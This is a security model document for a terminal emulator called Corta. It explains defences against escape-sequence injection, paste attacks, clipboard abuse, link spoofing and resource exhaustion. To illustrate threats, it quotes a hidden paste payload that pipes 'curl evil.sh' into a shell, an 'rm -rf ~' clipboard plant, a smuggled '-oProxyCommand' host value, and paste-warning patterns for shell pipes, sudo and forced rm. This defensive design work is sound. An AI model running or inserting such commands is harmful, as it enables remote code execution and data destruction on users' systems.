# Corta — Security Model

[Documentation index](README.md) · [Project overview](../README.md)

A terminal emulator is a program that renders **untrusted input with
full user privileges**. Every byte it parses may come from a hostile
source: a crafted filename, a malicious repository's `git log`, the
output of `curl`, a compromised remote host over SSH.

This document is a design constraint, not a checklist for later. Several
of its conclusions are "do not implement X" — those belong in the design
before the code exists.

---

## 1. Threat Model

**Assumed hostile:** all bytes arriving from the PTY. The user did not
choose them and frequently cannot see them.

**Assumed trusted:** the local user, the config file, and the shell they
chose to run.

**Explicitly out of scope:** an attacker who already executes code as the
user. A terminal cannot defend against that, and pretending otherwise
adds complexity without safety.

**The core risk is inversion of control.** Terminal escape sequences let
output influence the terminal's state — and, through query responses and
the clipboard, influence *input*. Anywhere output can become input is
where the real vulnerabilities are.

---

## 2. Escape Sequence Injection

### 2.1 The general rule

> Any sequence that causes the terminal to **write to the child's
> stdin** is a potential command injection. Responses must be
> fixed-format and must never contain attacker-supplied text.

Query/response sequences are required for correctness
(`CONFORMANCE.md` §1.2) — DA1, DA2 and DSR-CPR are P0. They are safe
because their responses are constants or numeric cursor coordinates. The
danger begins the moment a response carries back a string that the
stream itself supplied. OSC 99 capability queries have one deliberately
narrow exception required for multiplexer routing: the query id may be echoed
only after checking `[A-Za-z0-9_.+-]{1,32}`. All other response bytes are fixed.
No activation, close-event or alive reports are sent. OSC 7501 probes receive
only the constant `OSC 7501 ; ? ST`.


### 2.2 Never implement title reporting

Setting the icon name or window title (OSC 0 / 1 / 2) is safe and expected. **Reading it
back (`ESC [ 21 t`) is not, and Corta will not implement it.**

The attack is well known: hostile output sets the title to arbitrary
text, then asks the terminal to report it. The reply is injected into the
shell's stdin as if typed. With a newline in the payload, this is
arbitrary command execution from merely `cat`-ing a file.

The same reasoning applies to any future sequence that echoes stored
state back to the child. This is listed as a non-goal in `DESIGN.md` §6.

XTGETTCAP replies select names and values from a fixed capability table; an
unknown or malformed name gets a constant negative reply without an echoed name.
DECRQSS accepts only the SGR status query: the positive reply serialises numeric
pen state, and every other query gets a constant negative reply. Colour-scheme
reports contain only the live theme's dark/light value. None reports titles.

### 2.3 Bracketed paste is a security feature

`?2004` is classified P0 in `CONFORMANCE.md`, not P1, for this reason:
without it, pasting text containing a newline executes it immediately.
Copying a command from a web page where a hidden element appended
`\ncurl evil.sh | sh\n` is a real and repeatedly exploited attack.

- Bracketed paste is enabled by default.
- When a paste contains a newline **and** the application has not enabled
  bracketed paste mode, warn before sending (unless explicitly disabled).
- `paste-warning = dangerous` (default) also warns for pipes into shells
  (and the same feed through `bash <(…)` or `sh -c "$(curl …)"`),
  `sudo`, recursive forced `rm`, backslash-newline continuations and
  `ConcealingScalars`, regardless of bracketed paste. `always` additionally
  warns on any multiline paste; `off` disables dialogs. The pane-local
  suppression checkbox lasts only for the pane. The dialog names each risk
  and displays concealed scalars as Unicode codes. Cancel queues no bytes;
  cancellation of an already queued paste still uses `Paste.closing`.
  Deterministic conservative patterns can produce false positives and do
  not prove other text safe. There is no network or model lookup.
- Strip `ESC` and other C0 control characters from pasted text — a paste
  is data, never a command stream — and DEL and the C1 range with them:
  DEL is a line editor's backspace, and C1 holds CSI and ST.

### 2.4 URLs and hyperlinks

⌘-clicking a URL launches another application. Treat the target as
hostile input:

- **Allowlist schemes**: `http`, `https`, `mailto`. Nothing else. A
  `file://` or custom-scheme URL can invoke an arbitrary registered
  handler.
- **Show the real target** before opening. This is mandatory for OSC 8
  hyperlinks, where display text and destination differ *by design* —
  that is phishing as a protocol feature.
- **Never auto-open** anything. Opening is always an explicit user
  action.

**As implemented (M4.6, M6.8).** The detector's pattern can only match
the three allowlisted schemes, so a `file://` string in terminal output
is plain text; the scheme is then re-checked at the hand-off to
`NSWorkspace`, because that is the line between terminal output and
another application launching. An explicit OSC 8 hyperlink wins over
pattern detection — the program said what the target is — and the ⌘-hover
tooltip names *that* target, not the text under the pointer, which is the
only thing that makes the "show the real target" rule mean anything.

The target shown is the URL that opens, not the text the stream sent
(`PanePointer.target(of:)`, S17): the host in IDNA form, anything invisible
percent-encoded, and userinfo removed — from what is shown *and* what is
opened. `https://аpple.com` with a Cyrillic `а` reads as Apple until it is
written `xn--pple-43d.com`, and `user@host` puts a familiar name before the
real one.

### 2.4.1 Text sent to the shell

Dropping a file on a pane types its path at the prompt (M7.6). A
filename is attacker-influenceable and can contain `;`, backticks or
`$(…)`, so the path is POSIX single-quoted before it is sent: an
unquoted drop of a maliciously named file would be a command waiting for
a Return. The same path handles text returned by a Services item.

This does not contradict §2.1. That rule forbids writing *stream-supplied*
text back to the child — output the terminal received. A dropped path is
a user action naming a file the user chose, which is what typing is.

**As implemented (S04, 2026-09-06).** Drops and Services-returned text go
through the exact funnel a ⌘V paste uses (`ViewController.insertAsPaste`):
each dropped path is stripped of ESC and C0 control characters *before*
quoting (`Paste.sanitized`), and the payload gets the §2.3 newline warning
when the child has not enabled bracketed paste. A filename can contain a
newline, so the earlier assumption that a dropped path never does is no
longer relied on — quoting alone is not the whole defence.

The quoting walks Unicode scalars, not Swift `Character`s. A shell reads
bytes, and `'` or `\` followed by a combining mark or a joiner is one
grapheme cluster that compares unequal to `"'"`; matched by `Character`, the
quote was written raw and closed the quoted run. The app-typed `cd` of Go to
Parent Directory and Go to Project Root uses the same quoting.

Command History's **Fill** and **Run** send a command read back from the
grid, between OSC 133 marks that any output can forge. Fill only types it;
Run also sends Return, so it does so only for text the user saw whole: one
line, no tab, no wider than the row laid it out — measured in the row's own
font, since a scalar count let wide characters push a payload past the
truncation — and the same text the row drew, since output can rewrite the
record's row between the list's once-a-second refreshes and the click.
Anything else is filled, to be read at the prompt and run by the user's
Return.

### 2.5 Bidirectional and invisible characters

Corta does not implement RTL/bidi (`DESIGN.md` §6), which removes the
"Trojan Source" class of attack where U+202E visually reorders text so
that what is displayed differs from what is executed.

The remaining requirement: **do not render bidi and other invisible
control characters as nothing.** Draw them as a visible replacement
glyph. Invisible-by-default is what makes the attack work.

**As implemented (S16, 2026-10-07).** `ConcealingScalars` is the one list:
U+202A–202E and U+2066–2069 (embeddings, overrides, isolates), U+180E,
U+200B, U+2060–2064, U+206A–206F and U+FEFF (zero-width and deprecated
format characters), and the tag characters U+E0001 and U+E0020–E007F, which
encode ASCII invisibly. Tags pass only as a subdivision flag — U+1F3F4, at
most seven tags, nothing after the cancel tag — so a flag cannot carry a
hidden message. The
grid draws each as U+FFFD in a cell of its own, so a copy of what was shown
holds what was shown; OSC 52 strips them. ZWJ, ZWNJ and LRM/RLM stay
zero-width — emoji sequences and real bidi text need them. Before S16 they
were folded invisibly into the previous cell, which is exactly the failure
this section describes. Incoming pasted text is checked against the same
list before sending, and the warning preview exposes each matching scalar
as a visible Unicode code (§2.3), including bidi overrides in otherwise
harmless text.

### 2.6 OSC 52 clipboard

Useful — it is how copying from Neovim on a remote host reaches the local
clipboard — and genuinely dangerous.

- **Write** (remote sets the local clipboard): implemented in M7.11, off
  by default, behind `allow-clipboard-write`. Any output could place
  `rm -rf ~` or an attacker's wallet address into the clipboard for the
  user to paste later, so the default stands and the switch is in
  Settings. The core only records the decoded text
  (`PerformerState.pendingClipboardCopy`); the *policy* check lives in the
  app, which is the layer that has a user to ask.
- **Read** (remote queries the local clipboard): **never implemented.**
  It exfiltrates whatever the user last copied — passwords, tokens — to
  any host that can print bytes. There is no configuration for this; it
  is simply absent. `OSC 52 ; c ; ?` is parsed only far enough to be
  discarded, and answers nothing.
- **What a write may carry:** the decoded text loses `ConcealingScalars`
  and every control but tab, LF and CR. Corta's paste strips controls again,
  but the pasteboard reaches other applications.

### 2.7 Directory and history completion reports (OSC 134)

The bundled zsh line editor reports a revision, selection index, typed basename prefix, and up to
20 percent-encoded folder labels, bounded by the parser's 4096-byte OSC limit.
Labels reject control characters and are display-only. Corta never echoes
a label into stdin. A user selection sends only fixed widget key sequences;
the shell retrieves and quotes its own candidate and edits BUFFER, without
eval or accept-line. Reports are ignored during commands and alternate-screen
applications. Startup wrappers are private temporary files, restore ZDOTDIR,
and source the user's existing startup files without modifying them.

While it shows, the overlay takes Tab, Left/Right and Esc, so a report is
believed only from the pane's own shell. The automatic zsh bootstrap writes a
random per-session token into its wrapper `.zshrc` as an unexported shell
variable; the widget puts it before every report, and the core drops a report
without it (`DirectoryCompletion.untokened`). Output can forge `133;D` and a
prompt, but a `cat`ted file or a remote shell over `ssh` cannot know the
token, so it can no longer take those keys or draw a fake suggestion at the
cursor. The token survives a terminal reset; a shell started some other way
has none and shows no suggestions. Labels show `ConcealingScalars` as U+FFFD,
as the grid does (§2.5).

The tokened `h;revision;suffix` report carries a percent-encoded history
suffix of at most 512 UTF-8 bytes, rejects controls, and shares the same
display-only renderer; Right/End sends only a fixed accept-widget key,
and zsh appends its own retained suffix without evaluating or executing it.
History can contain typed secrets: suggested text is only drawn, never
logged, notified, persisted, or read from `HISTFILE`.

### 2.8 Working-directory reports name a host, never a spawn target

OSC 7's payload is a `file://host/path` URL, and a shell reached over `ssh`
reports a directory on *that* host. `Terminal.workingDirectory` accepts only
a local host — empty, `localhost` or this machine's own names, compared
case-insensitively and ignoring a trailing FQDN dot — so every local
consumer (new tabs, splits, session restore, file references) is
unreachable by a remote path by construction. Restore also drops a saved
directory that does not exist locally.

A remote report is recorded separately as the pane's `RemoteContext`, for
the title badge, the history's host filter and the SFTP browser. Its host is
attacker-influenced text: displayed, never parsed for credentials, paths to
run or hosts to connect to without the user's own command. The first SFTP
connection to a reported host in a run shows the name, prefilled and
editable with its provenance stated, and connects only on the user's
Connect (`RemoteHostConsent`, in memory, never persisted); a recent host is
only one the user typed or picked and then connected to. SSH config aliases
are only the names after `Host` in `~/.ssh/config` and its `Include`s —
patterns left out, no other value read, nothing executed; at most 32 files
of 256 KiB, four levels and 200 names. Both lists pass the character check
a typed host does (`SSHDestination`), and picking one only fills the field.

---

### 2.9 Program status and notification text

Claude Code is currently the only dedicated task-state integration; generic
protocol acceptance does not imply integration with other coding agents.
OSC 7501/21337 state and OSC 9/777/99 notices are self-reported metadata,
including `app`; none grants trust or runs anything. ConEmu GuiMacro and
process execution (OSC 9;6 and 9;7) are inert. Titles/messages remove all
controls and concealing scalars. The program's title appears only inside a
labelled pane message, beneath Corta's own `notificationTitle`; it never
becomes the system notification title. Agent permission/question/sign-in
notices use Corta's fixed localised text. `notify-from-programs = false`
disables both notice paths; `agent-status = false` hides agent chrome.

### 2.10 OSC ecosystem limits and refusals (#411)

| Request | Policy and reason |
|---|---|
| OSC 46; OSC 5113; OSC 1337 File without inline=1 | Refused: terminal output cannot choose log/download/transfer file paths |
| OSC 50; OSC 1337 SetProfile | Refused: verified font and settings configuration belongs to the user (D10/D12) |
| OSC 1337 StealFocus | Refused: output never pulls a window forward |
| OSC 1337 SetBadgeFormat | Refused: persistent program text over the canvas needs a separate decision |
| OSC 1337 ReportVariable | Refused: no program text or variable values echoed into child input (§2.1–2.2) |
| OSC 1337 Custom | Refused: no arbitrary script consumers (D09) |
| OSC 5522 read; MIME aliases; non-text; primary selection | Refused: no clipboard disclosure, file data or extra clipboard surfaces; same user-controlled write gate as OSC 52. A completed text write is answered with a fixed `status=DONE`, `EPERM` (writes disallowed) or `EIO` (pasteboard failure) |
| OSC 9;9 cwd | Ignored: no host, so remote paths cannot become local spawn targets (§2.8) |

OSC 1337 CurrentDir and OSC 633 P;Cwd update remote metadata while a remote
host is known. Hostless local reports still pass the PTY's kernel cwd check
before use for spawning. RemoteHost names are bounded ASCII and informational.
RequestAttention only bounces the Dock while the app is inactive; `no` cancels
the pane's prior request. No text is passed to the attention API.

New replies contain only fixed keys/names, parsed palette indices, RGB channels
or numeric cell metrics. Unknown OSC 21 keys are dropped instead of echoed.
PNG and GIF are the only encoded raster types admitted; the existing isolated
helper pins the ImageIO type and dimensions and decodes index zero only. The
8192-pixel side, 16-Mpixel and all shared image/texture budgets still apply.

## 3. Resource Exhaustion

The parser must survive adversarial input without crashing, hanging, or
allocating without bound. These caps are asserted in the fuzz harness
(`CONFORMANCE.md` §4.3) and are also memory requirements
(`PERFORMANCE.md` §4).

| Input                      | Cap                                                   |
| -------------------------- | ----------------------------------------------------- |
| OSC / DCS string length    | 4096 bytes ordinarily; discard the sequence on overflow and resynchronise |
| iTerm2 image OSC | File: base64 of at most 64 MiB decoded data plus 4100 header bytes, and never more than the pane/process image allowance left when the sequence begins (the parser asks before buffering); FilePart: 1 MiB per packet. A placement spans at most 4096 cells each way, as kitty's `c=`/`r=` do. Multipart total: at most 64 MiB decoded and the pane/process allowance. Unrelated OSC/CSI/APC abandons it; malformed base64, declared-size mismatch and oversized dimensions are dropped. The parser releases large string capacity after dispatch. Large base64 decoding uses the existing decode pause outside the session lock |
| Extended clipboard / pointer stack | OSC 5522: 8192-byte packet cap, 3072 decoded bytes per text transaction, publish only at end; any invalid part discards it. OSC 22: 16 fixed names per screen; oldest evicted, RIS clears both |
| APC (Kitty graphics) chunk | 132 KiB — one `kitten icat` chunk plus its header; discard the sequence on overflow and resynchronise. A whole image is capped separately, as is a pane's image memory |
| Kitty image memory         | 64 MB per image; 320 MB per pane across *both* screens (the alternate screen gets what the parked main screen left) with an unfinished transmission charged at its decoded size; 1 GB across every pane (`ImageMemoryBudget`, each session charged after every feed slice — exceeded by at most one image per session storing at the same instant) |
| Kitty PNG / iTerm2 PNG and GIF-first-frame decoding | `corta-image-decoder`, a process of its own under the independent App Sandbox (no access to host user files or network entitlements), 10 s, a pixel mapping of at most the 16 M-pixel cap plus row-alignment padding, and an 8-byte stdout limit; the app re-checks the header's dimensions and the pixel count. The helper maps an inherited, immediately unlinked shared-memory descriptor inside its sandbox, so decoded pixels never travel over stdout |
| Compressed Kitty image (`o=z`) | Inflates to exactly its declared pixels (RGB, RGBA) or at most the 64 MB image cap (PNG); the stream stops at the ceiling and the image is refused, so the expansion is never allocated. The zlib header and Adler-32 must check out; any other `o=` value is refused |
| CSI parameter count        | 16 (xterm's limit); ignore the remainder               |
| CSI parameter value        | Clamp to a sane maximum before use                     |
| Repeat counts (e.g. `REP`) | Clamp to the screen or scrollback dimension            |
| Scrollback                 | Configured line cap, enforced by the ring buffer       |
| Title stacks | Ten window titles and ten icon names per terminal, each bounded by the 4096-byte OSC cap; overflow discards the oldest entry, empty pops do nothing; RIS clears both |
| Underline colours | 4095 interned colours per screen, at most two screens per pane; zero falls back to the cell foreground. Reclaim only entries absent from live cells, compressed history and both pens; defer low-yield sweeps for 1023 failed interns. Snapshots own their value copy; screen replacement/RIS drops the table |
| Glyph atlas                | Bounded with eviction                                  |
| Pattern detection over output | Linear in the text: URL and `path:line` detectors have no overlapping quantifiers, and a hover scans at most 100,000 cells — the main thread runs them |

An unterminated OSC string is the canonical case: a stream that opens one
and never closes it must not accumulate gigabytes in a buffer.

The decoder's sandbox is checked by the suite, not per decode:
`ImageDecoderProcessTests` runs the helper's `--check-sandbox` mode, which
must be refused both reads and writes of an existing private file outside
its container; `--check-network` must be refused an outgoing connection.
The signature applies the sandbox before main and grants no inheritance,
network or file-access exceptions. Standard system resources and the
helper's own container remain available under App Sandbox. Checking it on every
image logged a sandbox violation for each picture shown.

Unknown sequences must be **safely ignored**. Because `$TERM` announces
`xterm-256color` (`DECISIONS.md` D08), programs will send sequences Corta
does not implement. Skipping them cleanly is a correctness requirement
and a robustness one.

---

## 4. Process and Platform

### 4.1 The App Sandbox is disabled, deliberately

`ENABLE_APP_SANDBOX = NO`. A terminal must spawn arbitrary processes with
the user's full privileges; that is its entire purpose, and it is
incompatible with the sandbox. iTerm2 and Ghostty are likewise
unsandboxed. Consequences, accepted:

- Distribution via the Mac App Store is not possible.
- `ENABLE_HARDENED_RUNTIME = YES` stays on, and notarization is required
  for distribution outside the App Store.

### 4.2 Child processes inherit the terminal's TCC permissions

This is the most underappreciated risk in the entire design, and it is
worth stating plainly:

> If Corta is granted Full Disk Access, Camera, Microphone, or Contacts
> permission, **every program run inside it inherits that grant.**

A single `curl … | sh` inside a terminal with Full Disk Access has Full
Disk Access. Therefore:

- Corta requests **no** TCC permission it does not itself need.
- Documentation must warn users about granting Full Disk Access to a
  terminal, rather than recommending it to silence a prompt.

### 4.3 Spawning children safely

`DESIGN.md` §7.2 covers the correctness hazard (the Swift runtime is not
async-signal-safe between `fork` and `exec`). The security requirements
alongside it:

- Reset the signal mask and dispositions in the child.
- Close all inherited descriptors except the PTY replica
  (`POSIX_SPAWN_CLOEXEC_DEFAULT`; `DescriptorHygieneTests` pins it).
- Establish a new session and controlling terminal (`POSIX_SPAWN_SETSID`
  / `TIOCSCTTY`) so job control and signals are correctly scoped.
- Sanitise the environment; do not leak internal variables to the child.

The SFTP browser spawns `/usr/bin/ssh`, and that process holds the
user's SSH session. `CORTA_SFTP_SSH` substitutes another program for it,
so `RemoteWorkflowUITests` can drive the real flow against a local
`sftp-server`; anything able to set Corta's launch environment could use
it the same way. Only a Debug build (the separate `CortaDev` application,
D22) reads it, only an absolute path to an existing executable is
accepted, and each use is logged under the `diagnostics` category. The
other launch switches (`TESTING.md`, "Environment switches") measure or
relocate state and substitute nothing.

### 4.4 Child lifecycle

On window or tab close, send `SIGHUP` to the child's **process group**,
not just the direct child. Leaking orphaned process groups is both a
resource leak and a surprise for the user, who reasonably believes
closing a window stopped what was in it. A group still there ten seconds
later — it ignored `SIGHUP` — gets `SIGKILL`, and is reaped. Only that
group: a job the shell moved into its own group is the shell's to end.

### 4.5 Secure keyboard entry

Shipped in B16 as `secure-keyboard-entry` (`docs/CONFIGURATION.md` §2),
off by default. `SecureInput` is the only caller of
`EnableSecureEventInput`/`DisableSecureEventInput`; it holds one bit of
state and recomputes it from three facts — the setting, whether Corta is
active, whether a terminal window is key — so the system counter is never
above one and is released at quit whatever else happened. A lock in the
titlebar reflects the *engaged* state, not the setting: the moment another
application is frontmost the lock is open, and the titlebar says so. It is
a user-facing option rather than a default because it is system-wide and
also blocks accessibility clients, macro tools and text expanders.

### 4.6 External automation is a third trust boundary

B16 adds two ways for something *outside* a Corta window to act on Corta:
a system-wide hotkey and three App Intents (open a window, focus a window,
toggle the Quick Terminal). Neither accepts text for a child's stdin, and
neither ever will: an automation assembled from a shared Shortcut or a web
page is no more trusted than escape sequences off the PTY. The one
parameter an intent takes is a directory, checked to exist and handed to
`spawn` as its working directory. Windows are addressed by an identity
minted at creation (`TerminalWindowController.windowID`), never by title —
titles are written by the child process — and a stale identity fails with
an error rather than resolving to whichever window is nearest. The hotkey
is a Carbon `RegisterEventHotKey`, dispatched by the window server: it
needs no Accessibility permission (rule 7) and, unlike an `NSEvent`
global monitor, keeps working under Secure Keyboard Entry. Terminal
transcripts are never indexed for Spotlight.

### 4.7 The update feed is signed, and its key sits in the release environment

An installed Corta accepts an update only when `appcast.xml` on `main`
carries an EdDSA signature that the public key baked into the app
verifies — Developer ID and notarisation satisfy Gatekeeper, not Sparkle.
The signature is produced by `.github/workflows/appcast.yml`, called by
`release.yml` in the run a person requests on `main` (D20, amended
2026-10-06). The private key is a secret of the `release` GitHub
environment, which admits only `main` and — since that amendment — no
longer waits for a reviewer: the boundary is the code admitted to `main`
and the person who requests the run, which for this repository is one
maintainer credential (D20 says what that costs). The key reaches
`generate_appcast` on stdin rather than as a file or an argument. The
feed item is then held to `corta-release-check --appcast
--require-notarized` — build number, enclosure URL, exact length,
signature, Developer ID, staple, Gatekeeper — before a pull request
carries it to `main` through the ordinary checks. The key has no
revocation path (a new public key is unknown to every copy that has not
updated), which is why it lives in an environment no pull request or
other branch can reach rather than as a plain repository secret, and why
every third-party action and Sparkle's own tools in that workflow are
pinned by hash. The Developer ID certificate
`release.yml` signs with and the App Store Connect API key it notarises
with sit in the same environment; the
certificate reaches the runner only inside a keychain the job creates
and deletes.

Since 1.1.9, updates use a Developer ID signed, notarised disk image, with
the app also notarised and stapled (D26). The feed retains historical ZIP
entries; both formats keep EdDSA verification. Signed-feed enforcement,
zero grace period and verification before mounting/extraction are unchanged.

### 4.8 SFTP's sign-in questions are a fourth trust boundary

An SFTP connection's `ssh` asks for a password, a key passphrase, a
one-time code or a new host key through `SSH_ASKPASS` (D27): it runs
Corta's own executable with the question, and that process carries it to
the app over a Unix socket. Whatever reaches that socket could try to have
a question shown — or read an answer — so a request is answered only when
all of these hold:

- The socket sits in a fresh `0700` directory in the user's temporary
  folder (`mkdtemp`), mode `0600`, removed at quit.
- The request carries the token of a live connection — 32 random bytes,
  compared in constant time. The token is in that ssh's environment, and
  so in the environment of everything ssh itself runs: a `ProxyJump`'s
  inner ssh, a `ProxyCommand`, a `KnownHostsCommand`. Those are programs
  the user's own `~/.ssh/config` chose to run; `ChildEnvironment` keeps
  the token out of every shell Corta spawns.
- The sender (`LOCAL_PEERPID`) descends, within four generations, from an
  ssh that connection spawned — so a jump host's inner ssh may ask. The
  ssh is spawned suspended and recorded with its start time before it
  runs; a later process given the same pid after it exits has another
  start time and is refused. The token alone is not enough: the same
  user's processes can read ssh's environment.
- A closed connection's token is dead: the broker holds it weakly, and
  nothing listens again once the app has stopped the broker at quit.

The request is one line of at most 16 KiB, read under a five-second
timeout on a queue of its own, so a silent client holds up no other. A
keyboard-interactive prompt is the *server's* text: the dialog shows it
with controls and concealing scalars as U+FFFD, at most 24 lines and 2,000
characters, and says it comes from OpenSSH or the server. A host-key
dialog defaults to Cancel. In the background Corta bounces in the Dock
rather than taking focus; with no window open, the question gets a window
of its own. The answer is written to that socket and nowhere else — not
stored, not logged — and the dialog closes, answering nothing, the moment
the asking process goes away. A refused password or code — not a key's
passphrase, which only makes ssh skip that key — ends the ssh it came from — `SIGTERM` to the admitted process, checked again by
its start time, never Corta itself — because OpenSSH reads a failed askpass
as an empty answer and would send it and ask again. Within §1's threat model a process already
running as the user is out of scope; the ancestry check exists so that one
*reading* ssh's environment cannot use the token on its own.

### 4.9 Local status and themes cross no boundary

The optional status bar reads local public OS counters and metadata. It neither
runs shell commands for polling nor connects to remote hosts, and sends no
metrics or host details over the network. All windows share one sampler, which
stops when no enabled bar is visible. The privacy manifest declares required
API reasons; it does not grant additional permissions or claim telemetry.

Custom themes are settings stored through the existing configuration store.
The graphical editor validates draft names/colors and checks for concurrent
edits before saving. Input-source badges use OS metadata, not keystroke contents;
private IME modes are deliberately left unknown. Neither feature changes the
execution or clipboard trust boundaries described above.

### 4.10 Space: project folders, restored sessions and remote files

Space (D30) adds project folders, sessions that start again after a
restart, and ways into a session's remote files. Each is listed here with
what it trusts and what it refuses, so an audit can check them one by one.

| Where | What crosses | Trusted because | Refused or bounded |
| --- | --- | --- | --- |
| Opening a project | A folder chosen in an open panel | The user picked it | Nothing in the folder is read, run or written; it is only new sessions' working directory |
| `space.json` | Projects, sessions (number, directory, preset name, SSH destination, the user's name for it), the grid's layout | App-owned, owner-only (`0600`), written only by Corta | Read back validated field by field: absolute paths only, at most 64 projects × 32 sessions × 6 panels, divider fractions clamped, SSH destinations re-parsed (`SSHTarget.parse`, so an option-shaped host such as `-oProxyCommand=…` is dropped), names stripped of controls and cut to 64 characters; a newer format is neither read nor written over |
| A session starting again | A login shell in the saved directory, the configured preset of that name, or `ssh` to the saved destination | The user created that session; the destination is one they typed into the connect dialog | Never a command line from the file; only when its project is first opened in a launch, not at launch; SSH asks for its password or passphrase through `SSH_ASKPASS` every time (D27), nothing stored; an agent CLI is not resumed — its own `--resume` is the user's to run |
| Session titles in the sidebar and headers | The agent's reported name, the foreground process name, the SSH destination, the kernel's working directory | Displayed only | `PaneWindowTitle.sanitizedTitleComponent` (§2.9), as the window title; a name the user gives wins and is never replaced by program output |
| **Browse Files on This Host…** (a remote session) | The host and directory the remote shell reported over OSC 7 (§2.8), or the destination the user connected to | The SFTP browser's own rules | The first connection to a *reported* host in a run is confirmed in the browser (`RemoteHostConsent`), as from the Shell menu; one window per destination |
| **Remote Files ▸** (a project) | SSH destinations of the project's sessions, from `space.json` | Each was typed or picked by the user in the connect dialog | Listed only from those records — an `ssh` typed at a prompt leaves none and is not offered; connects only on the user's choice |
| A remote file dragged onto a terminal | The dragged row's `sftp://user@host:port/path`, noted in the process when the drag begins (`SFTPRemoteDrag`) — never read off the pasteboard, and never taken from another app | A drag is the user's own action, and the path is text they can see before pressing Return | Accepted only by a pane whose session is on that host — same host, and same user and port where both name one; a path with any control character is refused outright, not cleaned (a server can name a folder with a newline, and a cleaned path would be a different one); inserted single-quoted for every shell (`PaneCommands.shellQuoted`) and as a paste, so bracketed paste and the paste warning apply (§2.3) and nothing runs until Return. The URL names no password and no key file |

Two residual risks, accepted:

- A pane's host is, for a session reached by typing `ssh` at a prompt, the
  host the *remote shell* reports (§2.8). A hostile remote shell can claim
  another host's name, and a path dragged from that host's browser would be
  accepted there. What reaches it is the path the user dragged, quoted and
  unexecuted — the same text they could have typed.
- `space.json` names hosts that are connected to again, without a click,
  when the project is opened. Anything able to write that file already runs
  as the user; the file's validation keeps a forged entry to a destination
  the connect dialog would also have accepted.

## 5. Data at Rest

**Terminal contents are not automatically persisted.** Scrollback routinely
contains credentials. Cold scrollback compression and search indexes remain
in memory; neither creates a history file. Copy/export commands are explicit exceptions: a user
can save selected text, command output, or the whole terminal through a
Save panel. The file is written owner-only (`0600`); the destination and any
later sharing are the user's choice.

**Custom session restoration saves plaintext metadata, not terminal text.**
`restore-windows` defaults to `true`. `state.json` can contain window geometry,
split layout, focused pane, working directories, preset identifiers and
launch metadata. Setting `restore-windows = false` disables restoration. The file is
owner-only (`0600`), as are `directory-history.json` and `recent-hosts.json`.
Saved directories and host/preset metadata may themselves be sensitive.
Space's `space.json` holds the same kinds of metadata; §4.10 lists what it
contains and how it is read back.
Space keeps its project folders and their sessions in `space.json`, owner-only
too, with the same kinds of metadata and no terminal text; it is written
whatever `restore-windows` says, because the project list is what Space is.
Nothing is written into a project folder, and nothing is read from one: a
folder may come from anyone's repository, and a file there naming sessions
would be a way to make Corta start them.

This is separate from AppKit restoration. Terminal windows set
`isRestorable = false` to prevent macOS restoring stale frames or retaining
terminal content; `applicationSupportsSecureRestorableState` is not the
policy switch for Corta's own JSON metadata.

**Long-task notifications carry no terminal content.** They report only an
outcome/duration beneath Corta's pane name, never OSC 0/2 text or commands.
**Program notifications are an explicit exception:** when
`notify-from-programs = true` (default), bounded OSC 9/777/99 title/body text
can reach Notification Center, including the lock screen and its separate
retention store. It is labelled as a pane message, stripped of controls and
concealing scalars, capped at 2,048 UTF-8 bytes, coalesced into one mutable
notice per pane and delivered at most once every five seconds per pane.
This can include secrets a program deliberately puts in its notification.
Disable the setting to keep such text out. OSC 7501 blocked notices contain
only Corta's fixed text for the reported reason. Pane teardown removes its
program notice and cancels pending delivery and expiry.

**The config file holds settings only** (M6.1). It is a plain text file
at `~/.config/corta/config` with no credential-shaped field, and nothing
from the terminal stream is ever written into it.

**Remote editing deliberately creates local files.** Managed copies and
approval snapshots live under Application Support/RemoteEdit. Directories
are restricted to mode 0700 and files to 0600; reused copies are tightened
when opened. A copy whose content still matches its approved digest and that
nobody opened or changed for 30 days is eligible for background cleanup when
the store loads; an undecided edit is kept. Each run checks at most 32 copies
and hashes at most 256 MiB (plus an EOF probe per file); excess copies wait for
a later run. Opening a remote copy awaits that maintenance asynchronously. A ⌘-click or Edit copies at most 64 MB. Downloads create partials with 0600 and refuse a partial-file
symlink. Download files and managed directories/files have inherited ACLs
cleared before use. This does not exclude administrators or backups; parent
storage policy and intentionally shared export destinations still matter.

An upload writes a partial and renames it over the destination, so the
partial's mode is the file's from then on. A replaced regular file keeps its
own mode, set-id bits included, and its group where the server lets the owner
set it; a symbolic link that the upload replaces passes on its target's mode.
A new name asks for the source's permission bits at creation and the server's
umask narrows them, so a 0777 file from a FAT volume does not land
world-writable. While it fills, the partial grants group and others no more
than the result and the owner read and write; a replaced file's exact mode is
set by handle after the last write, never by a path that could be swapped.

Upload prompts bind to a SHA-256 digest of the edit. Upload sends a private
snapshot matching that digest, so an edit after the prompt needs another
approval and an edit during transfer cannot replace the approved bytes.
Remote preflight compares size/mtime and downloaded content with the stored
SHA-256 baseline. Older entries without a digest require a conflict decision.
This detects same-size/same-mtime changes, but SFTP does not supply an atomic
compare-and-swap: a remote writer can still race the preflight and rename.

Directory downloads reject existing destination symlink components. This
is protection against pre-existing local state, not a filesystem sandbox
against a local process deliberately swapping directories during a transfer.

**Development storage routing is not credential isolation.** `.dev` and
`CORTA_STAGE_DIR` redirect Corta-owned settings/state/cache. They inherit
HOME and SSH_AUTH_SOCK. Tests needing isolated authentication use temporary
keys, an explicit SSH configuration, `IdentityAgent none`, no forwarding,
and a separate known_hosts; never alter the user's SSH files.

After connection establishment, each remote-edit SFTP operation has a 120-second
deadline. Expiry closes that connection, unwinds pending requests and offers the
upload decision again; other operations sharing that connection also fail and
must reconnect. This is an operation deadline, including a transfer, rather
than a throughput guarantee.

Remote editing requires an explicit `open-file-command`. Managed downloads,
including reused copies, never use LaunchServices' default file handler:
`.command`, `.terminal` and similar handlers can execute remote bytes locally.
The configured command remains the user's trusted editor choice and receives
separate arguments, never shell interpolation.

### User-requested Clear Screen

Clear Screen never requests a shell redraw through PTY input. At a ready
integrated prompt it moves retained grid lines and editor cursor metadata;
it does not feed prompt text back through the parser or write any control
character to the child. Unsubmitted commands stay unexecuted. Running main-
screen output keeps the existing erase behavior, while alternate-screen
applications are left intact. OSC prompt markers describe display boundaries;
they do not authorize execution.

## 6. Rules Summary

For quick reference during implementation and review:

1. Every byte from the PTY is hostile.
2. Never write attacker-supplied text back to the child's stdin.
3. Title query, OSC 52 read: not implemented, by design, not by omission.
4. Bracketed paste on by default; strip control characters from pastes.
5. URL schemes are allowlisted; nothing opens without a user action.
6. Every parser input has an explicit cap; unknown sequences are ignored
   cleanly.
7. Request no TCC permission Corta does not itself need.
8. Never automatically persist terminal text; document explicit export exceptions.

---

